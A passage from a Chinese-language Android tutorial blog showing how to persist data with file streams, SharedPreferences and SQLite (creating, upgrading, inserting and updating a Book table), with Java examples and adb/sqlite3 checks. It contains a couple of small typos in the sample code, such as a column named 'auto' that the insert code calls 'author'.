class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EditText edit;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        edit = (EditText) findViewById(R.id.edit);</span><br><span class="line">        String inputText = load();</span><br><span class="line">        <span class="keyword">if</span>(!TextUtils.isEmpty(inputText))&#123;</span><br><span class="line">            edit.setText(inputText);</span><br><span class="line">            edit.setSelection(inputText.length());</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"Restoring succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        String inputText = edit.getText().toString();</span><br><span class="line">        save(inputText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(String inputText)</span></span>&#123;</span><br><span class="line">        FileOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">"data"</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> OutputStreamWriter(out));</span><br><span class="line">            writer.write(inputText);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(writer != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FileInputStream in = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder content = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            in = openFileInput(<span class="string">"data"</span>);</span><br><span class="line">            reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String line = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                content.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(reader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样重启程序后就能恢复文本内容了。</p><h2 id="SharedPreferences存储"><a href="#SharedPreferences存储" class="headerlink" title="SharedPreferences存储"></a>SharedPreferences存储</h2><p>SharedPreferences是使用键值对的方式来存储数据的，同时还支持多种不同的数据类型存储。</p><h3 id="将数据存储到SharedPreferences中"><a href="#将数据存储到SharedPreferences中" class="headerlink" title="将数据存储到SharedPreferences中"></a>将数据存储到SharedPreferences中</h3><h4 id="获取SharedPreference对象"><a href="#获取SharedPreference对象" class="headerlink" title="获取SharedPreference对象"></a>获取SharedPreference对象</h4><p>首先要获取到SharedPreference对象，Android中主要提供了3种方法用于得到SharedPreference对象。</p><h5 id="Context类中的getSharedPreference-方法"><a href="#Context类中的getSharedPreference-方法" class="headerlink" title="Context类中的getSharedPreference()方法"></a>Context类中的getSharedPreference()方法</h5><p>此类接收两个参数，第一个用于指定文件名称，存放在<code>/data/data/&lt;packagename&gt;/shared_prefs/</code>目录下；第二个参数用于指定操作模式，默认是MODE_PRIVATE，和之间传入0效果相同，表示只有当前的应用程序才可以对这个SharedPreferences文件进行读写。</p><h5 id="Activity类中的getPreferences-方法"><a href="#Activity类中的getPreferences-方法" class="headerlink" title="Activity类中的getPreferences()方法"></a>Activity类中的getPreferences()方法</h5><p>与上一个方法相似，不过只接收一个操作模式参数，当前活动的类名会被作为SharedPreferences的文件名。</p><h5 id="PreferenceManager类中的getDafaultSharedPreferences-方法"><a href="#PreferenceManager类中的getDafaultSharedPreferences-方法" class="headerlink" title="PreferenceManager类中的getDafaultSharedPreferences()方法"></a>PreferenceManager类中的getDafaultSharedPreferences()方法</h5><p>这是一个静态方法，接收一个Context参数，并自动使用当前应用程序的包名作为前缀来命名SharedPreferences文件。</p><h4 id="向SharedPreferences文件中存储数据"><a href="#向SharedPreferences文件中存储数据" class="headerlink" title="向SharedPreferences文件中存储数据"></a>向SharedPreferences文件中存储数据</h4><p>主要可以分3步实现：</p><ol><li>调用SharedPreferences对象的edit()方法来获取一个SharedPreferences.Editor对象。</li><li>向SharedPreferences.Editor对象中添加数据，如putString()等。</li><li>调用apply()方法将添加的数据提交，从而完成数据存储操作。</li></ol><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>新建SharedPreferences项目，然后添加一个Button按钮。</p><p>然后修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button = findViewById(R.id.save);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">"name"</span>, <span class="string">"nuoye"</span>);</span><br><span class="line">                editor.putInt(<span class="string">"age"</span>, <span class="number">21</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">"married"</span>, <span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在文件浏览器里打开可以发现是以xml格式存储的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>nuoye<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">boolean</span> <span class="attr">name</span>=<span class="string">"married"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"21"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="从SharePreferences中读取数据"><a href="#从SharePreferences中读取数据" class="headerlink" title="从SharePreferences中读取数据"></a>从SharePreferences中读取数据</h3><p>SharedPreferences对象中提供了一系列get方法，与put是一样对应的，其包含两个参数，第一个参数是键值，第二个参数是默认值，即表示当传入的键值找不到时就会返回默认值。</p><p>添加一个restore的按钮，然后修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button button1 = findViewById(R.id.save);</span><br><span class="line">        Button button2 = findViewById(R.id.restore);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">"name"</span>, <span class="string">"nuoye"</span>);</span><br><span class="line">                editor.putInt(<span class="string">"age"</span>, <span class="number">21</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">"married"</span>, <span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        button2.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                SharedPreferences pref = getSharedPreferences(<span class="string">"data"</span>, MODE_PRIVATE);</span><br><span class="line">                String name = pref.getString(<span class="string">"name"</span>, <span class="string">"nobody"</span>);</span><br><span class="line">                <span class="keyword">int</span> age = pref.getInt(<span class="string">"age"</span>, <span class="number">0</span>);</span><br><span class="line">                Boolean married = pref.getBoolean(<span class="string">"married"</span>, <span class="keyword">true</span>);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"name is "</span>+ name);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"age is "</span>+ age);</span><br><span class="line">                Log.d(<span class="string">"MainActivity"</span>, <span class="string">"married is "</span>+ married);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样即可完成从SharedPreferences中存储和读取数据了。</p><h2 id="SQLite数据库存储"><a href="#SQLite数据库存储" class="headerlink" title="SQLite数据库存储"></a>SQLite数据库存储</h2><p>SQLite是一款轻量级的关系型数据库，不仅支持SQL语法，还遵循了数据库的ACID事务，并且不需要设置用户名和密码就可以使用。</p><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>Android提供了SQLiteOpenHelper帮助类，借助这个类可以非常简单地对数据库进行创建和升级。</p><p>SQLiteOpenHelper有两个抽象方法，分别是onCreate()和onUpgrade()，我们必须在自己的帮助类里重写这两个方法。</p><p>SQLiteOpenHelper还有两个重要的实例方法：getReadableDatabase()和getWritableDatabase()。这两个方法都可以创建或打开一个现有的数据库，并返回一个可对数据库进行读写操作的对象。</p><p>SQLiteOpenHelper中有两个构造方法可供重写，一般使用参数少的那个，其参数有4个，分别是Context，数据库名，Cursor（一般传入null），数据库版本号（可用于对数据库进行升级操作）。</p><p>数据库文件会存放在<code>/data/data/&lt;packagename&gt;/database/</code>目录下。</p><p>接下来新建一个DatabaseTest项目以体验其用法。</p><p>新建类MyDatabaseHelper，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_BOOK = <span class="string">"create table Book("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"auto text, "</span></span><br><span class="line">            + <span class="string">"price real, "</span></span><br><span class="line">            + <span class="string">"pages integer, "</span></span><br><span class="line">            + <span class="string">"name text)"</span>;</span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                           SQLiteDatabase.CursorFactory factory, <span class="keyword">int</span> version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span></span>&#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">"Create succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后添加一个Button，再修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyDatabaseHelper dbHelper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        dbHelper = <span class="keyword">new</span> MyDatabaseHelper(<span class="keyword">this</span>, <span class="string">"bookstore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br><span class="line">        Button create_database = (Button) findViewById(R.id.create_database);</span><br><span class="line">        create_database.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                dbHelper.getWritableDatabase();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后可以发现弹出了Toast信息，然后这里用adb来查看下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">$ <span class="built_in">cd</span> /data/data/com.example.databasetest/databases</span><br><span class="line">$ sqlite3 bookstore.db</span><br><span class="line">sqlite&gt; .table</span><br><span class="line">Book              android_metadata</span><br><span class="line">sqlite&gt; .<span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>可以看到Book数据库已经创建成功了。</p><h3 id="升级数据库"><a href="#升级数据库" class="headerlink" title="升级数据库"></a>升级数据库</h3><p>升级数据库是用到onUpgrade()这个方法。</p><p>我们可以在MyDatabaseHelper修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_BOOK = <span class="string">"create table Book("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"auto text, "</span></span><br><span class="line">            + <span class="string">"price real, "</span></span><br><span class="line">            + <span class="string">"pages integer, "</span></span><br><span class="line">            + <span class="string">"name text)"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CREATE_CATEGORY = <span class="string">"create table Category("</span></span><br><span class="line">            + <span class="string">"id integer primary key autoincrement, "</span></span><br><span class="line">            + <span class="string">"category_name text, "</span></span><br><span class="line">            + <span class="string">"category_code integer)"</span>;</span><br><span class="line">    <span class="keyword">private</span> Context mContext;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyDatabaseHelper</span><span class="params">(Context context, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                            SQLiteDatabase.CursorFactory factory, <span class="keyword">int</span> version)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, name, factory, version);</span><br><span class="line">        mContext = context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span></span>&#123;</span><br><span class="line">        db.execSQL(CREATE_BOOK);</span><br><span class="line">        db.execSQL(CREATE_CATEGORY);</span><br><span class="line">        Toast.makeText(mContext, <span class="string">"Create succeeded"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span></span>&#123;</span><br><span class="line">        db.execSQL(<span class="string">"drop table if exists Book"</span>);</span><br><span class="line">        db.execSQL(<span class="string">"drop table if exists Category"</span>);</span><br><span class="line">        onCreate(db);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改MainActivity中的这一行代码，把版本号改为2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbHelp = <span class="keyword">new</span> MyDatabaseHelper(<span class="keyword">this</span>, <span class="string">"bookstore.db"</span>, <span class="keyword">null</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>这样就可以对数据库进行升级了。</p><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>可以直接使用SQL语句完成操作。</p><p>另外SQLiteDatabase中提供了insert()方法，有三个参数，第一个参数是表明；第二个参数用于在未指定添加数据的情况下给某些可能为空的列自动赋值，一般传入null；第三个参数是一个ContentValues对象，提供了一系列put()方法重载，用于向ContentValues中添加数据。</p><p>首先添加按钮，然后添加如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Button add_data = (Button) findViewById(R.id.add_data);</span><br><span class="line">add_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(<span class="string">"name"</span>,<span class="string">"The Da Vinci Code"</span>);</span><br><span class="line">        values.put(<span class="string">"author"</span>,<span class="string">"Dan Brown"</span>);</span><br><span class="line">        values.put(<span class="string">"pages"</span>,<span class="number">454</span>);</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">16.96</span>);</span><br><span class="line">        db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">        values.clear();</span><br><span class="line">        values.put(<span class="string">"name"</span>,<span class="string">"The Lost Symbol"</span>);</span><br><span class="line">        values.put(<span class="string">"author"</span>,<span class="string">"Dan Brown"</span>);</span><br><span class="line">        values.put(<span class="string">"pages"</span>,<span class="number">510</span>);</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">19.95</span>);</span><br><span class="line">        db.insert(<span class="string">"Book"</span>, <span class="keyword">null</span>, values);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>点击按钮后在adb中运行命令即可查看到数据已经成功插入数据库了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select * from Book;</span><br><span class="line">1|Dan Brown|16.96|454|The Da Vinci Code</span><br><span class="line">2|Dan Brown|19.95|510|The Lost Symbol</span><br></pre></td></tr></table></figure><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><p>同样，SQLiteDatabase也提供了update()方法，它接收4个参数，分别是表名、ContentValues对象（包含要更新的数据）以及两个约束条件（用于约束更新某一行或某几行数据，不指定的话默认更新所有行）。</p><p>同样是新建button，然后添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Button update_data = (Button) findViewById(R.id.update_data);</span><br><span class="line">update_data.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        SQLiteDatabase db = dbHelper.getWritableDatabase();</span><br><span class="line">        ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        values.put(<span class="string">"price"</span>,<span class="number">10.99</span>);</span><br><span class="line">        db.update(<span class="string">"Book"</span>, values, <span class="string">"name = ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"The Da Vinci Code"</span>&#125;);</span><br><span class="line">        values.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在adb下运行命令即可看到价格已经更新了。</p><p>注：如果有多个参数，可修改为（以2个为例）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.update(<span class="string">"Book"</span>, values, <span class="string">"name = ? AND pages &lt; ?"</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"The Da Vinci Code"</span>, <span class="string">"500"</span>&#125;);</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>SQLiteDatabase也提供了delete()方法，它接收三个参数，分别为：表名，以及两个约束条件（同update）。</p><p>新建button，然后添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Button delete_data = (Button) findViewById(R.id.delete_data);</span><br><span 